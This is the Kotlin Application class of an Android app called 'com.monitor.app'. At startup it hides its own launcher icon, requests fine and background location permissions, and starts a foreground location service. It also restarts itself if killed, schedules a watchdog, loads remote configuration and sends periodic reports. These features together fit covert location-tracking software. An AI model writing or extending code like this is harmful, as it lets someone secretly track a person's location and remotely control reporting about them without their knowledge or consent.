package com.monitor.app

import android.Manifest
import android.app.Application
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import androidx.hilt.work.HiltWorkerFactory
import androidx.work.*
import com.monitor.app.config.ConfigManager
import com.monitor.app.diag.DiagnosticLogger
import com.monitor.app.keepalive.KeepAliveManager
import com.monitor.app.location.LocationService
import com.monitor.app.report.ReportWorker
import com.monitor.app.ui.GuideActivity
import com.monitor.app.util.TimeRangeMatcher
import dagger.hilt.android.HiltAndroidApp
import java.time.LocalTime
import javax.inject.Inject

@HiltAndroidApp
class MonitorApplication : Application(), Configuration.Provider {

    @Inject lateinit var configManager: ConfigManager
    @Inject lateinit var keepAliveManager: KeepAliveManager
    @Inject lateinit var diagnosticLogger: DiagnosticLogger
    @Inject lateinit var workerFactory: HiltWorkerFactory

    override val workManagerConfiguration: Configuration
        get() = Configuration.Builder()
            .setWorkerFactory(workerFactory)
            .build()

    override fun onCreate() {
        super.onCreate()

        // Hide launcher icon
        disableLauncherIcon()

        // Detect if previously killed
        val wasKilled = keepAliveManager.checkWasKilled()
        if (wasKilled) {
            diagnosticLogger.log("service_killed")
            keepAliveManager.restartIfKilled()
        }

        // Initialize config (loads cached, then async fetches remote)
        configManager.init()

        // Check permissions on Android 10+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val missingPermissions = mutableListOf<String>()
            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED)
                missingPermissions.add(Manifest.permission.ACCESS_FINE_LOCATION)
            if (checkSelfPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED)
                missingPermissions.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
                checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED)
                missingPermissions.add(Manifest.permission.POST_NOTIFICATIONS)

            if (missingPermissions.isNotEmpty()) {
                // Launch GuideActivity to request permissions
                val guideIntent = Intent(this, GuideActivity::class.java)
                guideIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                guideIntent.putExtra("missing_permissions", missingPermissions.toTypedArray())
                startActivity(guideIntent)
            }
        }

        // Start foreground location service
        val intent = Intent(this, LocationService::class.java)
        startForegroundService(intent)

        // Schedule watchdog
        val config = configManager.getConfigBlocking()
        keepAliveManager.scheduleWatchdog(config.keep_alive.watchdog.check_interval_seconds)

        // Schedule report worker
        scheduleReportUpdate()

        // Schedule cleanup
        CleanupWorker.schedule(this)
    }

    private fun scheduleReportUpdate() {
        val now = LocalTime.now()
        val config = configManager.getConfigBlocking()
        val active = config.report.intervals.find { interval ->
            val range = TimeRangeMatcher.TimeRange(interval.start, interval.end)
            TimeRangeMatcher.isInRange(range, now)
        }
        val intervalSeconds = active?.interval_seconds ?: 3600
        ReportWorker.schedule(this, intervalSeconds)
    }

    private fun disableLauncherIcon() {
        val componentName = android.content.ComponentName(
            this, "com.monitor.app.ui.GuideActivity"
        )
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }
}
